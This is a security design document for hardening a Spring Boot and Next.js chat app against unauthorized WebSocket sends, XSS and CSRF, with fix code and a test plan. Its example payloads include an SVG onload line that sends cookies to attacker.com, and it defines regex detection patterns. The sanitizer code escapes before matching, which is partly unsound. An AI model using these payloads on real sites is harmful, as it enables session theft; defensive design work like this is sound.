# Security Hardening: WebSocket Authorization, XSS Protection, and CSRF Defense - Design

## Overview

This design document specifies the implementation strategy for fixing three critical security vulnerabilities in the real-time chat system:

1. **WebSocket Authorization**: Add per-message authorization checks to prevent unauthorized room access
2. **XSS Protection**: Implement message sanitization on backend and frontend to prevent script injection
3. **CSRF Protection**: Add CSRF token generation, validation, and enforcement for state-changing operations

The fixes integrate with the existing Spring Boot backend and Next.js frontend architecture, adding security layers without disrupting the core messaging functionality. The approach follows defense-in-depth principles with checks at multiple layers (controller, service, frontend).

## Glossary

- **Bug_Condition (C)**: The condition that triggers the security vulnerability - when unauthorized users access protected resources, malicious scripts are injected, or CSRF attacks are performed
- **Property (P)**: The desired secure behavior - only authorized users can access resources, scripts cannot execute, and CSRF tokens prevent forged requests
- **Preservation**: Existing functionality for authorized users and legitimate content that must remain unchanged
- **WebSocket Authorization**: Per-message verification that the user is a member of the target room before processing STOMP messages
- **XSS Sanitization**: HTML entity escaping and dangerous pattern removal to prevent script injection
- **CSRF Token**: Cryptographically secure token generated per session and validated on state-changing operations
- **STOMP Controller**: Spring component handling WebSocket messages at `/app/*` destinations
- **SimpMessagingTemplate**: Spring component for broadcasting messages to STOMP topics
- **Message Entity**: JPA entity representing a persisted chat message with sender, room, content, and timestamp

## Bug Details

### Bug Condition 1: Missing WebSocket Authorization

The bug manifests when an authenticated user sends a message via WebSocket to a room they are NOT a member of. The system broadcasts the message without verifying membership authorization.

**Formal Specification:**
```
FUNCTION isBugCondition_WebSocketAuth(input)
  INPUT: input of type StompMessage with userId, roomId, messageContent
  OUTPUT: boolean
  
  RETURN input.userId IS_AUTHENTICATED
         AND NOT userIsMemberOfRoom(input.userId, input.roomId)
         AND messageIsProcessed(input)
         AND messageIsBroadcastedToRoom(input.roomId)
END FUNCTION
```

**Examples:**
- User A (authenticated) sends message to Room B (which they're not a member of) → Message is broadcast to Room B subscribers (WRONG)
- User A joins Room B, leaves Room B, then sends message to Room B → Message is broadcast (WRONG)
- User A attempts to send message to Room B via direct STOMP call without joining → Message is broadcast (WRONG)

### Bug Condition 2: XSS Vulnerability - Unescaped Message Content

The bug manifests when a user sends a message containing HTML/JavaScript code. The system stores and broadcasts the raw content without sanitization, allowing script execution in other users' browsers.

**Formal Specification:**
```
FUNCTION isBugCondition_XSS(input)
  INPUT: input of type Message with content
  OUTPUT: boolean
  
  RETURN containsDangerousPatterns(input.content)
         AND NOT isSanitized(input.content)
         AND messageIsStoredAsIs(input.content)
         AND messageIsDisplayedWithoutEscaping(input.content)
END FUNCTION
```

**Examples:**
- User sends: `<script>alert('xss')</script>` → Script executes in other users' browsers (WRONG)
- User sends: `<img src=x onerror="alert('xss')">` → onerror handler executes (WRONG)
- User sends: `<svg onload="fetch('http://attacker.com?cookie='+document.cookie)">` → Cookie theft (WRONG)
- User sends: `Hello <b>world</b>` → Bold formatting is applied (WRONG - legitimate HTML should be escaped)

### Bug Condition 3: CSRF Vulnerability - Missing Token Validation

The bug manifests when a user performs state-changing operations (POST, PUT, DELETE) without CSRF token validation. An attacker can forge requests from a malicious website.

**Formal Specification:**
```
FUNCTION isBugCondition_CSRF(input)
  INPUT: input of type HttpRequest with method, endpoint, headers
  OUTPUT: boolean
  
  RETURN input.method IN ['POST', 'PUT', 'DELETE']
         AND isStateChangingOperation(input.endpoint)
         AND (NOT hasCsrfToken(input.headers) OR NOT isValidCsrfToken(input.headers))
         AND requestIsProcessed(input)
END FUNCTION
```

**Examples:**
- Attacker crafts form on malicious site that POSTs to `/api/rooms` → Room is created in victim's account (WRONG)
- Attacker crafts request to `/api/rooms/{id}/members` to add themselves → They gain access (WRONG)
- Legitimate user makes request with valid CSRF token → Request is processed (CORRECT)

## Expected Behavior

### Preservation Requirements

**Unchanged Behaviors:**
- Authorized users who ARE members of a room can send messages and have them broadcast normally
- Messages with legitimate content (no HTML/scripts) are stored and displayed exactly as sent
- Authorized users can perform state-changing operations with valid CSRF tokens
- System continues to broadcast JOIN/LEAVE system messages to room members
- Message history retrieval continues to work for authorized users
- Real-time message delivery latency remains under 100ms for authorized users
- WebSocket connection establishment and heartbeat continue to work normally

**Scope:**
All inputs that do NOT involve unauthorized access, malicious scripts, or CSRF attacks should be completely unaffected by these fixes. This includes:
- Messages from authorized room members
- Messages with special characters (emoji, unicode, etc.)
- Legitimate HTML content that should be escaped (e.g., `<b>` tags)
- Authorized API requests with valid CSRF tokens
- WebSocket connections from authenticated users

## Hypothesized Root Cause

Based on the bug description and architecture analysis, the root causes are:

1. **Missing Authorization Checks in STOMP Controller**:
   - The `ChatMessageController.sendMessage()` method validates membership at the service layer but not at the controller level
   - No per-message authorization check before processing STOMP frames
   - Service layer check can be bypassed if controller doesn't enforce it

2. **No Input Sanitization Pipeline**:
   - Message content is stored directly without HTML entity escaping
   - Frontend renders messages without proper escaping (likely using innerHTML or dangerouslySetInnerHTML)
   - No centralized sanitization utility or filter

3. **Missing CSRF Token Generation and Validation**:
   - No CSRF token generation on login or session creation
   - No CSRF token validation in REST controllers
   - No CSRF token included in frontend API requests
   - Spring Security CSRF protection not configured

4. **Incomplete Authorization Enforcement**:
   - Authorization check only happens in service layer, not in controller
   - No logging of authorization failures for security auditing
   - No error response sent to user on authorization failure

## Correctness Properties

Property 1: WebSocket Authorization - Only Members Can Send Messages

_For any_ WebSocket message where the sender is NOT a member of the target room (isBugCondition_WebSocketAuth returns true), the fixed system SHALL reject the message with an UnauthorizedException, send an error response to the user's error queue, and NOT broadcast the message to the room.

**Validates: Requirements 2.1, 2.2, 2.3, 2.4**

Property 2: XSS Protection - Message Content Is Sanitized

_For any_ message containing dangerous HTML/JavaScript patterns (isBugCondition_XSS returns true), the fixed system SHALL sanitize the content by escaping HTML entities before persistence, and render the escaped content on the frontend without executing any scripts.

**Validates: Requirements 2.5, 2.6, 2.7, 2.8**

Property 3: CSRF Protection - Token Validation Required

_For any_ state-changing HTTP request without a valid CSRF token (isBugCondition_CSRF returns true), the fixed system SHALL reject the request with a 403 Forbidden response and NOT process the state change.

**Validates: Requirements 2.9, 2.10, 2.11, 2.12**

Property 4: Preservation - Authorized Users Unaffected

_For any_ message from an authorized room member with legitimate content and valid CSRF token (NOT isBugCondition returns true), the fixed system SHALL process and broadcast the message exactly as before, preserving all existing functionality.

**Validates: Requirements 3.1, 3.2, 3.3, 3.4, 3.5, 3.6**

## Fix Implementation

### Fix 1: WebSocket Authorization

#### Changes Required

**File**: `src/main/java/org/example/chat/controller/ChatMessageController.java`

**Method**: `sendMessage(ChatMessageRequest request, StompHeaderAccessor accessor)`

**Specific Changes**:

1. **Add Authorization Check at Controller Level**:
   - Before processing the message, verify the user is a member of the target room
   - Throw `UnauthorizedException` if not a member
   - Log the authorization failure for security auditing

```java
@MessageMapping("/chat.send/{roomId}")
public void sendMessage(
    @DestinationVariable Long roomId,
    ChatMessageRequest request,
    StompHeaderAccessor accessor
) {
    // Get authenticated user from STOMP session
    User user = (User) accessor.getUser().getPrincipal();
    
    // NEW: Verify user is a member of the room
    if (!roomMembershipRepository.existsByUserAndChatRoom(user, roomId)) {
        logger.warn("Unauthorized message attempt: user {} to room {}", 
                    user.getId(), roomId);
        throw new UnauthorizedException(
            "User is not a member of this room"
        );
    }
    
    // Proceed with existing logic
    chatMessageService.sendMessage(user, roomId, request.getContent());
}
```

2. **Add Authorization Check in Service Layer** (defense-in-depth):
   - Verify membership again in service layer before persistence
   - This prevents bypassing controller checks

```java
public void sendMessage(User sender, Long roomId, String content) {
    ChatRoom room = chatRoomRepository.findById(roomId)
        .orElseThrow(() -> new RoomNotFoundException("Room not found"));
    
    // NEW: Verify membership at service layer
    if (!roomMembershipRepository.existsByUserAndChatRoom(sender, room)) {
        throw new UnauthorizedException(
            "User is not a member of this room"
        );
    }
    
    // Proceed with existing logic
    Message message = new Message(sender, room, content);
    messageRepository.save(message);
    
    // Broadcast to room subscribers
    messagingTemplate.convertAndSend(
        "/topic/room/" + roomId,
        new ChatMessagePayload(message)
    );
}
```

3. **Add Exception Handler for Authorization Failures**:
   - Send error message to user's error queue
   - Include error code and message

```java
@MessageExceptionHandler
public void handleAuthorizationException(
    UnauthorizedException ex,
    StompHeaderAccessor accessor
) {
    logger.error("Authorization error: {}", ex.getMessage());
    
    messagingTemplate.convertAndSendToUser(
        accessor.getUser().getName(),
        "/queue/errors",
        new ErrorMessage(
            "UNAUTHORIZED",
            "You are not a member of this room",
            ex.getMessage()
        )
    );
}
```

4. **Add Logging for Security Auditing**:
   - Log all authorization failures with user ID, room ID, timestamp
   - Include in security audit trail

```java
@Component
public class SecurityAuditLogger {
    private static final Logger auditLogger = 
        LoggerFactory.getLogger("SECURITY_AUDIT");
    
    public void logAuthorizationFailure(User user, Long roomId, String reason) {
        auditLogger.warn(
            "AUTHORIZATION_FAILURE: userId={}, roomId={}, reason={}, timestamp={}",
            user.getId(), roomId, reason, LocalDateTime.now()
        );
    }
}
```

### Fix 2: XSS Protection

#### Changes Required

**File**: `src/main/java/org/example/chat/util/HtmlSanitizer.java` (NEW)

**Specific Changes**:

1. **Create HTML Sanitization Utility**:
   - Escape HTML entities to prevent script injection
   - Remove dangerous patterns (script tags, event handlers, etc.)
   - Preserve legitimate content

```java
@Component
public class HtmlSanitizer {
    
    private static final Pattern DANGEROUS_PATTERNS = Pattern.compile(
        "<script|<iframe|<object|<embed|on\\w+\\s*=|javascript:",
        Pattern.CASE_INSENSITIVE
    );
    
    public String sanitize(String content) {
        if (content == null || content.isEmpty()) {
            return content;
        }
        
        // Escape HTML entities
        String escaped = HtmlUtils.htmlEscape(content);
        
        // Remove dangerous patterns
        String cleaned = DANGEROUS_PATTERNS.matcher(escaped)
            .replaceAll("");
        
        return cleaned;
    }
    
    public boolean containsDangerousPatterns(String content) {
        if (content == null) return false;
        return DANGEROUS_PATTERNS.matcher(content).find();
    }
}
```

2. **Add Sanitization to Message Service**:
   - Sanitize message content before persistence
   - Store sanitized content in database

```java
@Service
public class ChatMessageService {
    
    @Autowired
    private HtmlSanitizer htmlSanitizer;
    
    public void sendMessage(User sender, Long roomId, String content) {
        // ... authorization checks ...
        
        // NEW: Sanitize content before persistence
        String sanitizedContent = htmlSanitizer.sanitize(content);
        
        Message message = new Message(sender, room, sanitizedContent);
        messageRepository.save(message);
        
        // Broadcast sanitized content
        messagingTemplate.convertAndSend(
            "/topic/room/" + roomId,
            new ChatMessagePayload(message)
        );
    }
}
```

3. **Add Validation for Dangerous Content**:
   - Log attempts to inject malicious content
   - Include in security audit trail

```java
public void sendMessage(User sender, Long roomId, String content) {
    // ... authorization checks ...
    
    // NEW: Check for dangerous patterns and log
    if (htmlSanitizer.containsDangerousPatterns(content)) {
        securityAuditLogger.logXssAttempt(sender, roomId, content);
        logger.warn("XSS attempt detected from user {}: {}", 
                    sender.getId(), content);
    }
    
    String sanitizedContent = htmlSanitizer.sanitize(content);
    // ... rest of method ...
}
```

**File**: `frontend/lib/utils/sanitize.ts` (NEW)

**Specific Changes**:

1. **Create Frontend Sanitization Utility**:
   - Ensure frontend also escapes content for defense-in-depth
   - Use React's built-in escaping mechanisms

```typescript
export function sanitizeHtml(content: string): string {
  // Create a temporary element to leverage browser's HTML parsing
  const temp = document.createElement('div');
  temp.textContent = content; // textContent automatically escapes
  return temp.innerHTML;
}

export function isSafeContent(content: string): boolean {
  // Check for dangerous patterns
  const dangerousPatterns = /<script|<iframe|<object|<embed|on\w+\s*=/gi;
  return !dangerousPatterns.test(content);
}
```

2. **Update Message Display Component**:
   - Render messages as plain text with proper escaping
   - Never use dangerouslySetInnerHTML

```typescript
// frontend/components/chat/MessageList.tsx
export function MessageList({ roomId }: MessageListProps) {
  const messages = useChatStore((state) => state.messages[roomId] || []);
  
  return (
    <div className="message-list">
      {messages.map((msg) => (
        <div key={msg.id} className="message">
          <div className="message-header">
            <span className="sender">{msg.sender.displayName}</span>
            <span className="timestamp">{formatTime(msg.timestamp)}</span>
          </div>
          {/* NEW: Use textContent or plain text rendering */}
          <p className="message-content">
            {msg.content}
          </p>
        </div>
      ))}
    </div>
  );
}
```

### Fix 3: CSRF Protection

#### Changes Required

**File**: `src/main/java/org/example/chat/config/SecurityConfig.java`

**Specific Changes**:

1. **Configure Spring Security CSRF Protection**:
   - Enable CSRF protection for REST endpoints
   - Configure CSRF token repository and header name
   - Exclude WebSocket endpoints from CSRF (they use JWT)

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
                // Exclude WebSocket endpoints (they use JWT)
                .ignoringRequestMatchers("/ws/**")
            )
            .authorizeHttpRequests(authz -> authz
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/ws/**").permitAll() // WebSocket uses JWT
                .requestMatchers("/api/**").authenticated()
                .anyRequest().permitAll()
            )
            .addFilterBefore(
                new JwtAuthenticationFilter(),
                UsernamePasswordAuthenticationFilter.class
            );
        
        return http.build();
    }
    
    @Bean
    public CsrfTokenRepository csrfTokenRepository() {
        CookieCsrfTokenRepository repository = 
            CookieCsrfTokenRepository.withHttpOnlyFalse();
        repository.setHeaderName("X-CSRF-TOKEN");
        repository.setParameterName("_csrf");
        return repository;
    }
}
```

2. **Add CSRF Token Generation on Login**:
   - Generate CSRF token when user logs in
   - Include token in login response

```java
@RestController
@RequestMapping("/api/auth")
public class AuthController {
    
    @PostMapping("/login")
    public ResponseEntity<LoginResponse> login(
        @RequestBody LoginRequest request,
        HttpServletRequest httpRequest
    ) {
        // ... existing authentication logic ...
        
        // NEW: Generate CSRF token
        CsrfToken csrfToken = (CsrfToken) httpRequest
            .getAttribute(CsrfToken.class.getName());
        
        return ResponseEntity.ok(new LoginResponse(
            token,
            user,
            csrfToken.getToken() // Include CSRF token in response
        ));
    }
}
```

3. **Update Login Response DTO**:
   - Include CSRF token in response

```java
public class LoginResponse {
    private String token;
    private User user;
    private String csrfToken; // NEW
    
    public LoginResponse(String token, User user, String csrfToken) {
        this.token = token;
        this.user = user;
        this.csrfToken = csrfToken;
    }
    
    // Getters
}
```

**File**: `frontend/lib/api/client.ts`

**Specific Changes**:

1. **Store CSRF Token in Frontend**:
   - Store CSRF token from login response
   - Include in all state-changing requests

```typescript
// frontend/lib/store/authStore.ts
interface AuthState {
  user: User | null;
  token: string | null;
  csrfToken: string | null; // NEW
  login: (username: string, password: string) => Promise<void>;
  logout: () => void;
}

export const useAuthStore = create<AuthState>((set) => ({
  user: null,
  token: null,
  csrfToken: null,
  
  login: async (username: string, password: string) => {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password }),
    });
    
    const data = await response.json();
    
    set({
      user: data.user,
      token: data.token,
      csrfToken: data.csrfToken, // NEW: Store CSRF token
    });
  },
  
  logout: () => {
    set({ user: null, token: null, csrfToken: null });
  },
}));
```

2. **Add CSRF Token to API Requests**:
   - Include CSRF token in headers for state-changing requests

```typescript
// frontend/lib/api/client.ts
export async function apiCall<T>(
  url: string,
  options?: RequestInit
): Promise<T> {
  const authStore = useAuthStore.getState();
  
  const headers = {
    'Content-Type': 'application/json',
    ...options?.headers,
  };
  
  // NEW: Add CSRF token for state-changing requests
  if (options?.method && ['POST', 'PUT', 'DELETE'].includes(options.method)) {
    if (authStore.csrfToken) {
      headers['X-CSRF-TOKEN'] = authStore.csrfToken;
    }
  }
  
  try {
    const response = await fetch(url, {
      ...options,
      headers,
    });
    
    if (!response.ok) {
      const error = await response.json();
      throw new ApiError(error.message, response.status, error.code);
    }
    
    return response.json();
  } catch (error) {
    if (error instanceof ApiError) throw error;
    throw new NetworkError('Network request failed');
  }
}
```

3. **Add CSRF Token to Form Submissions**:
   - Include CSRF token in all form submissions

```typescript
// frontend/components/chat/RoomCreateModal.tsx
export function RoomCreateModal({ onClose }: RoomCreateModalProps) {
  const csrfToken = useAuthStore((state) => state.csrfToken);
  
  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    
    const formData = new FormData(e.currentTarget);
    
    // NEW: Include CSRF token
    const response = await fetch('/api/rooms', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrfToken || '', // Include CSRF token
      },
      body: JSON.stringify({
        name: formData.get('name'),
        description: formData.get('description'),
      }),
    });
    
    // ... handle response ...
  };
  
  return (
    <form onSubmit={handleSubmit}>
      {/* Form fields */}
    </form>
  );
}
```

## Testing Strategy

### Validation Approach

The testing strategy follows a three-phase approach:
1. **Exploratory Bug Condition Checking**: Surface counterexamples that demonstrate each vulnerability on unfixed code
2. **Fix Checking**: Verify that for all inputs where the bug condition holds, the fixed system produces the expected secure behavior
3. **Preservation Checking**: Verify that for all inputs where the bug condition does NOT hold, the fixed system preserves existing functionality

### Exploratory Bug Condition Checking

**Goal**: Surface counterexamples that demonstrate each vulnerability BEFORE implementing the fix. Confirm or refute the root cause analysis.

#### WebSocket Authorization Tests

**Test Plan**: Write tests that simulate WebSocket messages from unauthorized users and assert that the message is rejected.

**Test Cases**:
1. **Unauthorized User Sends Message**: User not in room sends message via STOMP (will fail on unfixed code)
2. **User Leaves Then Sends**: User leaves room, then sends message (will fail on unfixed code)
3. **User Joins Different Room**: User joins Room A, sends message to Room B (will fail on unfixed code)
4. **Membership Verification**: Verify membership check is called before broadcasting (will fail on unfixed code)

**Expected Counterexamples**:
- Message is broadcast to room subscribers even though sender is not a member
- No error response is sent to the unauthorized user
- No authorization failure is logged

#### XSS Vulnerability Tests

**Test Plan**: Write tests that send messages with malicious content and verify they are stored and displayed without sanitization.

**Test Cases**:
1. **Script Tag Injection**: Send `<script>alert('xss')</script>` (will execute on unfixed code)
2. **Event Handler Injection**: Send `<img src=x onerror="alert('xss')">` (will execute on unfixed code)
3. **SVG Injection**: Send `<svg onload="fetch('http://attacker.com')">` (will execute on unfixed code)
4. **HTML Entity Encoding**: Send `<b>bold</b>` (will render as bold on unfixed code)

**Expected Counterexamples**:
- Malicious scripts execute in other users' browsers
- Content is stored without escaping
- Frontend renders content with innerHTML instead of textContent

#### CSRF Vulnerability Tests

**Test Plan**: Write tests that send state-changing requests without CSRF tokens and verify they are processed.

**Test Cases**:
1. **POST Without Token**: Send POST to `/api/rooms` without CSRF token (will succeed on unfixed code)
2. **PUT Without Token**: Send PUT to `/api/rooms/{id}` without CSRF token (will succeed on unfixed code)
3. **DELETE Without Token**: Send DELETE to `/api/rooms/{id}` without CSRF token (will succeed on unfixed code)
4. **Invalid Token**: Send request with invalid CSRF token (will succeed on unfixed code)

**Expected Counterexamples**:
- State-changing requests are processed without CSRF token validation
- No 403 Forbidden response is returned
- Attacker can forge requests from malicious website

### Fix Checking

**Goal**: Verify that for all inputs where the bug condition holds, the fixed system produces the expected secure behavior.

**Pseudocode:**
```
FOR ALL input WHERE isBugCondition_WebSocketAuth(input) DO
  result := sendMessage_fixed(input)
  ASSERT result.isRejected = true
  ASSERT result.errorSent = true
  ASSERT result.messageBroadcasted = false
END FOR

FOR ALL input WHERE isBugCondition_XSS(input) DO
  result := sendMessage_fixed(input)
  ASSERT result.contentSanitized = true
  ASSERT result.storedContent = sanitized(input.content)
  ASSERT result.displayedContent = escaped(input.content)
END FOR

FOR ALL input WHERE isBugCondition_CSRF(input) DO
  result := apiCall_fixed(input)
  ASSERT result.statusCode = 403
  ASSERT result.stateNotChanged = true
END FOR
```

### Preservation Checking

**Goal**: Verify that for all inputs where the bug condition does NOT hold, the fixed system produces the same result as the original function.

**Pseudocode:**
```
FOR ALL input WHERE NOT isBugCondition_WebSocketAuth(input) DO
  ASSERT sendMessage_original(input) = sendMessage_fixed(input)
END FOR

FOR ALL input WHERE NOT isBugCondition_XSS(input) DO
  ASSERT sendMessage_original(input) = sendMessage_fixed(input)
END FOR

FOR ALL input WHERE NOT isBugCondition_CSRF(input) DO
  ASSERT apiCall_original(input) = apiCall_fixed(input)
END FOR
```

**Testing Approach**: Property-based testing is recommended for preservation checking because:
- It generates many test cases automatically across the input domain
- It catches edge cases that manual unit tests might miss
- It provides strong guarantees that behavior is unchanged for authorized users

### Unit Tests

**Backend - WebSocket Authorization:**
- Test that authorized users can send messages
- Test that unauthorized users receive error response
- Test that authorization check is called before broadcasting
- Test that authorization failures are logged

**Backend - XSS Protection:**
- Test that HTML entities are escaped
- Test that dangerous patterns are removed
- Test that legitimate content is preserved
- Test that XSS attempts are logged

**Backend - CSRF Protection:**
- Test that CSRF token is generated on login
- Test that CSRF token is validated on state-changing requests
- Test that requests without token are rejected
- Test that requests with invalid token are rejected

**Frontend - XSS Protection:**
- Test that message content is rendered as plain text
- Test that HTML is not rendered
- Test that special characters are preserved
- Test that sanitization utility escapes content

**Frontend - CSRF Token Handling:**
- Test that CSRF token is stored from login response
- Test that CSRF token is included in API requests
- Test that CSRF token is included in form submissions

### Property-Based Tests

**WebSocket Authorization:**
- Generate random users and rooms, verify only members can send messages
- Generate random authorization states, verify consistent behavior
- Test that authorization checks are enforced for all message types

**XSS Protection:**
- Generate random message content with various HTML patterns
- Verify all dangerous patterns are sanitized
- Verify legitimate content is preserved
- Test that sanitization is idempotent (sanitizing twice = sanitizing once)

**CSRF Protection:**
- Generate random state-changing requests with/without CSRF tokens
- Verify requests without valid tokens are rejected
- Verify requests with valid tokens are accepted
- Test that CSRF token validation is consistent

### Integration Tests

**WebSocket Authorization:**
- Connect multiple users to different rooms
- Verify each user can only send to their own rooms
- Verify unauthorized sends are rejected with error response
- Verify authorized sends are broadcast normally

**XSS Protection:**
- Send messages with various malicious payloads
- Verify payloads are sanitized before storage
- Verify other users receive sanitized content
- Verify no scripts execute in browsers

**CSRF Protection:**
- Create room with valid CSRF token (should succeed)
- Create room without CSRF token (should fail with 403)
- Create room with invalid CSRF token (should fail with 403)
- Verify legitimate operations with valid tokens continue to work

**End-to-End Security:**
- Test complete attack scenarios (unauthorized access, XSS injection, CSRF forgery)
- Verify all attacks are prevented
- Verify legitimate operations continue to work
- Verify security audit logs contain all attempts

